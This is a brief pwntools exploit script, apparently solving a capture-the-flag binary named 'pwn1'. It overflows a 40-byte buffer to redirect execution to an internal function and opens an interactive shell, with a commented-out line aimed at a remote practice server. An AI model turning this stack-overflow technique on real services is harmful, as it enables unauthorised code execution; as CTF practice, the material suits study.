from pwn import *



offset=32+8
bash_addr=0x000000000040201A
system_plt=0x0000000000401070
ret_addr=0x000000000040101a

eval_addr=0x00000000004011BB

payload=b'A'*offset+p64(eval_addr)

sh=process(['./pwn1'])
# sh=remote("gz.imxbt.cn",20202)
sh.sendline(payload)

sh.interactive()
